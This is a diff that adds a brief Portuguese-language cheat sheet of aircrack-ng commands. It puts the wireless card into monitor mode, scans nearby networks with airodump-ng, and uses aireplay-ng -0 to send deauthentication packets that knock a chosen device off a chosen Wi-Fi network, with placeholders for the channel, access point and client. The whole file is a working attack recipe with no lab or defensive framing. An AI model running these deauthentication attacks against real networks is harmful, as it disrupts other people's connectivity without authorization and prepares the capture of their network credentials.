@@ -1,0 +1,9 @@
+sudo su (para entrar em modo root)
+airmon-ng start wlan0
+(agora o wlan0 se chama wlan0mon)
+
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c (canal)
+aireplay-ng -0 (numero de ataques) -a (numero do wifi) -c (disposi) wlan0mon
+
+airmon-ng stop wlan0mon
